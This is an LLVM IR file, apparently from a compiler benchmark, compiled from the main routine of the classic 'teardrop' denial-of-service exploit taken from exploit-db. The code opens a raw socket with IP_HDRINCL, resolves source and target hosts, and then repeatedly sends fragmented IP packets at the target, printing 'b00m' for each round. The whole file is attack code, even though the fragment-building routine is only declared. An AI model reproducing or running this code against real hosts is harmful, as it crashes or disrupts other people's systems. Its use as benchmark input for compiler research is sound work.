; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_19103.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_19103.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i8* }

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [25 x i8] c"teardrop route|daemon9\0A\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_RAW = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [11 x i8] c"raw socket\00", align 1
@IPPROTO_IP = common dso_local global i32 0, align 4
@IP_HDRINCL = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [11 x i8] c"IP_HDRINCL\00", align 1
@.str.3 = private unnamed_addr constant [43 x i8] c"What the hell kind of IP address is that?\0A\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"s:t:n:\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = common dso_local global i32 0, align 4
@COUNT = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [24 x i8] c"Death on flaxen wings:\0A\00", align 1
@.str.6 = private unnamed_addr constant [16 x i8] c"From: %15s.%5d\0A\00", align 1
@.str.7 = private unnamed_addr constant [15 x i8] c" To: %15s.%5d\0A\00", align 1
@.str.8 = private unnamed_addr constant [11 x i8] c" Amt: %5d\0A\00", align 1
@.str.9 = private unnamed_addr constant [3 x i8] c"[ \00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"b00m \00", align 1
@.str.11 = private unnamed_addr constant [3 x i8] c"]\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.in_addr, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 1, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i8* null, i8** %10, align 8
  store i8* null, i8** %11, align 8
  store i32 0, i32* %12, align 4
  store i32 0, i32* %13, align 4
  %15 = load i32, i32* @stderr, align 4
  %16 = call i32 (i32, i8*, ...) @fprintf(i32 %15, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0))
  %17 = load i32, i32* @AF_INET, align 4
  %18 = load i32, i32* @SOCK_RAW, align 4
  %19 = load i32, i32* @IPPROTO_RAW, align 4
  %20 = call i32 @socket(i32 %17, i32 %18, i32 %19)
  store i32 %20, i32* %9, align 4
  %21 = icmp slt i32 %20, 0
  br i1 %21, label %22, label %25

22:                                               ; preds = %2
  %23 = call i32 @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0))
  %24 = call i32 @exit(i32 1) #3
  unreachable

25:                                               ; preds = %2
  %26 = load i32, i32* %9, align 4
  %27 = load i32, i32* @IPPROTO_IP, align 4
  %28 = load i32, i32* @IP_HDRINCL, align 4
  %29 = bitcast i32* %6 to i8*
  %30 = call i64 @setsockopt(i32 %26, i32 %27, i32 %28, i8* %29, i32 4)
  %31 = icmp slt i64 %30, 0
  br i1 %31, label %32, label %35

32:                                               ; preds = %25
  %33 = call i32 @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0))
  %34 = call i32 @exit(i32 1) #3
  unreachable

35:                                               ; preds = %25
  %36 = load i32, i32* %4, align 4
  %37 = icmp slt i32 %36, 3
  br i1 %37, label %38, label %43

38:                                               ; preds = %35
  %39 = load i8**, i8*** %5, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 0
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 @usage(i8* %41)
  br label %43

43:                                               ; preds = %38, %35
  %44 = load i8**, i8*** %5, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 1
  %46 = load i8*, i8** %45, align 8
  %47 = call i8* @name_resolve(i8* %46)
  store i8* %47, i8** %10, align 8
  %48 = icmp ne i8* %47, null
  br i1 %48, label %49, label %55

49:                                               ; preds = %43
  %50 = load i8**, i8*** %5, align 8
  %51 = getelementptr inbounds i8*, i8** %50, i64 2
  %52 = load i8*, i8** %51, align 8
  %53 = call i8* @name_resolve(i8* %52)
  store i8* %53, i8** %11, align 8
  %54 = icmp ne i8* %53, null
  br i1 %54, label %59, label %55

55:                                               ; preds = %49, %43
  %56 = load i32, i32* @stderr, align 4
  %57 = call i32 (i32, i8*, ...) @fprintf(i32 %56, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.3, i64 0, i64 0))
  %58 = call i32 @exit(i32 1) #3
  unreachable

59:                                               ; preds = %49
  br label %60

60:                                               ; preds = %82, %59
  %61 = load i32, i32* %4, align 4
  %62 = load i8**, i8*** %5, align 8
  %63 = call i32 @getopt(i32 %61, i8** %62, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  store i32 %63, i32* %8, align 4
  %64 = load i32, i32* @EOF, align 4
  %65 = icmp ne i32 %63, %64
  br i1 %65, label %66, label %83

66:                                               ; preds = %60
  %67 = load i32, i32* %8, align 4
  switch i32 %67, label %77 [
    i32 115, label %68
    i32 116, label %71
    i32 110, label %74
  ]

68:                                               ; preds = %66
  %69 = load i32, i32* @optarg, align 4
  %70 = call i32 @atoi(i32 %69)
  store i32 %70, i32* %12, align 4
  br label %82

71:                                               ; preds = %66
  %72 = load i32, i32* @optarg, align 4
  %73 = call i32 @atoi(i32 %72)
  store i32 %73, i32* %13, align 4
  br label %82

74:                                               ; preds = %66
  %75 = load i32, i32* @optarg, align 4
  %76 = call i32 @atoi(i32 %75)
  store i32 %76, i32* %7, align 4
  br label %82

77:                                               ; preds = %66
  %78 = load i8**, i8*** %5, align 8
  %79 = getelementptr inbounds i8*, i8** %78, i64 0
  %80 = load i8*, i8** %79, align 8
  %81 = call i32 @usage(i8* %80)
  br label %82

82:                                               ; preds = %77, %74, %71, %68
  br label %60

83:                                               ; preds = %60
  %84 = call i64 @time(i32 0)
  %85 = trunc i64 %84 to i32
  %86 = call i32 @srandom(i32 %85)
  %87 = load i32, i32* %12, align 4
  %88 = icmp ne i32 %87, 0
  br i1 %88, label %92, label %89

89:                                               ; preds = %83
  %90 = call i32 (...) @random()
  %91 = srem i32 %90, 65535
  store i32 %91, i32* %12, align 4
  br label %92

92:                                               ; preds = %89, %83
  %93 = load i32, i32* %13, align 4
  %94 = icmp ne i32 %93, 0
  br i1 %94, label %98, label %95

95:                                               ; preds = %92
  %96 = call i32 (...) @random()
  %97 = srem i32 %96, 65535
  store i32 %97, i32* %13, align 4
  br label %98

98:                                               ; preds = %95, %92
  %99 = load i32, i32* %7, align 4
  %100 = icmp ne i32 %99, 0
  br i1 %100, label %103, label %101

101:                                              ; preds = %98
  %102 = load i32, i32* @COUNT, align 4
  store i32 %102, i32* %7, align 4
  br label %103

103:                                              ; preds = %101, %98
  %104 = load i32, i32* @stderr, align 4
  %105 = call i32 (i32, i8*, ...) @fprintf(i32 %104, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.5, i64 0, i64 0))
  %106 = load i8*, i8** %10, align 8
  %107 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %14, i32 0, i32 0
  store i8* %106, i8** %107, align 8
  %108 = load i32, i32* @stderr, align 4
  %109 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %14, i32 0, i32 0
  %110 = load i8*, i8** %109, align 8
  %111 = call i8* @inet_ntoa(i8* %110)
  %112 = load i32, i32* %12, align 4
  %113 = call i32 (i32, i8*, ...) @fprintf(i32 %108, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6, i64 0, i64 0), i8* %111, i32 %112)
  %114 = load i8*, i8** %11, align 8
  %115 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %14, i32 0, i32 0
  store i8* %114, i8** %115, align 8
  %116 = load i32, i32* @stderr, align 4
  %117 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %14, i32 0, i32 0
  %118 = load i8*, i8** %117, align 8
  %119 = call i8* @inet_ntoa(i8* %118)
  %120 = load i32, i32* %13, align 4
  %121 = call i32 (i32, i8*, ...) @fprintf(i32 %116, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.7, i64 0, i64 0), i8* %119, i32 %120)
  %122 = load i32, i32* @stderr, align 4
  %123 = load i32, i32* %7, align 4
  %124 = call i32 (i32, i8*, ...) @fprintf(i32 %122, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.8, i64 0, i64 0), i32 %123)
  %125 = load i32, i32* @stderr, align 4
  %126 = call i32 (i32, i8*, ...) @fprintf(i32 %125, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.9, i64 0, i64 0))
  store i32 0, i32* %8, align 4
  br label %127

127:                                              ; preds = %141, %103
  %128 = load i32, i32* %8, align 4
  %129 = load i32, i32* %7, align 4
  %130 = icmp slt i32 %128, %129
  br i1 %130, label %131, label %144

131:                                              ; preds = %127
  %132 = load i32, i32* %9, align 4
  %133 = load i8*, i8** %10, align 8
  %134 = load i8*, i8** %11, align 8
  %135 = load i32, i32* %12, align 4
  %136 = load i32, i32* %13, align 4
  %137 = call i32 @send_frags(i32 %132, i8* %133, i8* %134, i32 %135, i32 %136)
  %138 = load i32, i32* @stderr, align 4
  %139 = call i32 (i32, i8*, ...) @fprintf(i32 %138, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i64 0, i64 0))
  %140 = call i32 @usleep(i32 500)
  br label %141

141:                                              ; preds = %131
  %142 = load i32, i32* %8, align 4
  %143 = add nsw i32 %142, 1
  store i32 %143, i32* %8, align 4
  br label %127

144:                                              ; preds = %127
  %145 = load i32, i32* @stderr, align 4
  %146 = call i32 (i32, i8*, ...) @fprintf(i32 %145, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.11, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @setsockopt(i32, i32, i32, i8*, i32) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i8* @name_resolve(i8*) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @atoi(i32) #1

declare dso_local i32 @srandom(i32) #1

declare dso_local i64 @time(i32) #1

declare dso_local i32 @random(...) #1

declare dso_local i8* @inet_ntoa(i8*) #1

declare dso_local i32 @send_frags(i32, i8*, i8*, i32, i32) #1

declare dso_local i32 @usleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
